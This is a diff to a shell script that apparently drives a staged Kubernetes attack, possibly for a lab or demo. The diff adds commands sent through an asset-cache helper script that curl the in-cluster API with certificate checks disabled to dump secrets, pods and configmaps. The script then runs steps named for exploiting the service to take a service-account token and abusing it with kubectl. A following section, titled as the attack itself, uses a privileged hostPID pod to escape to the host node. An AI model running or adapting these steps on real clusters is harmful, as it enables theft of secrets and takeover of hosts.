@@ -5,21 +5,16 @@ DIR="$( cd "$( dirname "${BASH_SOURCE[0]:-$0}" )" && pwd )"
 sleep 60
 
 ### Pre-requisites - Get Visa ServiceAccount Token
-$DIR/00_interactive_asset-cache.sh --ua curl --check
+
+$DIR/00_interactive_asset-cache.sh "bash -c 'curl -sS -k -H \"User-Agent: agent-kubectl\" https://kubernetes.default.svc/api/v1/secrets'"
 sleep 2
-$DIR/00_interactive_asset-cache.sh --ua curl --check
+$DIR/00_interactive_asset-cache.sh "bash -c 'curl -sS -k -H \"User-Agent: agent-kubectl\" https://kubernetes.default.svc/api/v1/pods'"
 sleep 2
-$DIR/00_interactive_asset-cache.sh --ua curl --check
+$DIR/00_interactive_asset-cache.sh "bash -c 'curl -sS -k -H \"User-Agent: agent-kubectl\" https://kubernetes.default.svc/api/v1/configmaps'"
 sleep 2
-$DIR/00_interactive_asset-cache.sh --ua curl --check
-sleep 2
-$DIR/00_interactive_asset-cache.sh --ua curl --check
-sleep 2
-$DIR/00_interactive_asset-cache.sh --ua curl --check
-sleep 2
-$DIR/00_interactive_asset-cache.sh --ua curl --check
-sleep 2
+
 $DIR/01_expoit_asset-cache_get_visa_token.sh
+
 $DIR/02_abuse_visa_serviceaccount_kubectl_from_pod.sh
 
 ### The Attack - Privileged Pod with hostPID to Escape to Host Node
